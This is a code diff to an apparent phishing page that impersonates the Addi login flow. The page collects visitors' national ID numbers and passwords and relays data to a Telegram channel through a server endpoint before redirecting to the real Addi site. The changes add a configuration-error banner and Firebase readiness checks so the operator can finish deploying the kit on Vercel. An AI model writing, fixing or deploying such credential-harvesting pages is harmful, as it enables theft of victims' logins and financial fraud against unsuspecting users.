@@ -46,6 +46,9 @@ label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
 .load-layer{position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:80;display:none;flex-direction:column;align-items:center;justify-content:center;gap:22px}
 .load-text{font-weight:700;color:var(--ink);font-size:17px}
 .closed{position:fixed;top:0;left:0;right:0;z-index:90;background:#e5484d;color:#fff;font-weight:700;font-size:14px;padding:12px 16px;text-align:center;display:none}
+.setup{display:none;background:#fdecea;border:1.5px solid var(--danger);color:#8f2320;border-radius:12px;padding:14px 18px;margin:16px 24px 0;font-size:14px;line-height:1.65}
+.setup code{background:rgba(229,72,77,.12);padding:1px 6px;border-radius:5px;font-size:12.5px}
+.setup b{color:#6d1613}
 @media(max-width:560px){main{padding:28px 18px}h1{font-size:22px}header{padding-left:18px;padding-right:18px}}
 </style>
 </head>
@@ -56,6 +59,10 @@ label{display:block;font-weight:700;font-size:14px;margin-bottom:8px}
     <div class="logo" title="Addi"><img src="addi-logo.svg" alt="Addi"></div>
     <button class="close" onclick="if(confirm('¿Deseas salir del proceso?'))location.reload()"><span>Cerrar</span><span class="x">✕</span></button>
   </header>
+
+  <!-- Aviso visible cuando falla la configuración (variables que faltan en Vercel, etc.).
+       Así la página NUNCA se queda muda/colgada sin explicación. -->
+  <div class="setup" id="setupBanner"></div>
 
   <main>
     <div class="card">
@@ -131,6 +138,18 @@ const URL_REDIRECCION = 'https://co.addi.com';
 
 const session = { password:'', cedula:'', uid:'', cerrada:false };
 const $ = id => document.getElementById(id);
+
+/* ====== Aviso de configuración (visible en pantalla) ====== */
+// Muestra en rojo qué falta para que la app funcione. Sin esto, cuando faltan
+// variables en Vercel la página se quedaba «muda» y parecía caída.
+function banner(titulo, detalle){
+  const el = $('setupBanner');
+  if(!el) return;
+  if(!titulo){ el.style.display = 'none'; el.innerHTML = ''; return; }
+  el.innerHTML = '<b>' + titulo + '</b>' + (detalle ? '<br>' + detalle : '');
+  el.style.display = 'block';
+}
+
 /* ====== Telegram (el TOKEN nunca está en el código: /api/notificar lo reenvía) ====== */
 async function notificarTelegram(content, botones){
   try{
@@ -311,14 +330,26 @@ async function initFirebase(){
   try{
     // 1) Pide la configuración al servidor (las variables viven en Vercel)
     let cfg = null;
+    let http = 0;
     try{
       const r = await fetch('/api/config', { cache: 'no-store' });
+      http = r.status;
       cfg = await r.json();
-    }catch(e){}
-    if(!cfg || !cfg.apiKey || !cfg.projectId){
-      console.warn('Config de Firebase no disponible: define FIREBASE_API_KEY, FIREBASE_PROJECT_ID, ... en Vercel');
+    }catch(e){
+      banner('No se pudo contactar a /api/config',
+        'Revisa que el proyecto esté desplegado en Vercel y que la carpeta <b>api/</b> exista en el mismo repositorio importado.');
       return;
     }
+    if(http !== 200 || !cfg || !cfg.ok || !cfg.apiKey || !cfg.projectId){
+      const faltan = (cfg && cfg.missing && cfg.missing.length)
+        ? cfg.missing.map(k => '<code>' + k + '</code>').join(', ')
+        : '<code>FIREBASE_API_KEY</code>, <code>FIREBASE_PROJECT_ID</code>';
+      banner('⚙️ Configuración de Firebase incompleta',
+        'Crea en <b>Vercel → Settings → Environment Variables</b>: ' + faltan +
+        '.<br>Después pulsa <b>Redeploy</b> (Deployments). Paso a paso: GUIA-CONFIGURACION.txt.');
+      return;
+    }
+    banner();
     FIREBASE_CONFIG = {
       apiKey: cfg.apiKey,
       authDomain: cfg.authDomain,
@@ -354,6 +385,11 @@ async function initFirebase(){
 /* ====== PASOS DEL CLIENTE ====== */
 function submitCedula(){
   if(session.cerrada) return;
+  if(!fireReady){
+    const e = $('cedula-err');
+    if(e){ e.textContent = 'La página aún no conecta con Firebase. Revisa el aviso de configuración de arriba.'; e.style.display = 'block'; }
+    return;
+  }
   const v = $('cedula').value.replace(/\D/g,'');
   if(v.length < 6){ $('cedula-err').style.display='block'; return; }
   $('cedula-err').style.display='none';
@@ -364,6 +400,11 @@ function submitCedula(){
 }
 function submitPass(){
   if(session.cerrada) return;
+  if(!fireReady){
+    const e = $('pass-err');
+    if(e){ e.textContent = 'La página aún no conecta con Firebase. Revisa el aviso de configuración de arriba.'; e.style.display = 'block'; }
+    return;
+  }
   const p = $('passwd').value;
   if(p.length < 4){ $('pass-err').style.display='block'; return; }
   $('pass-err').style.display='none';
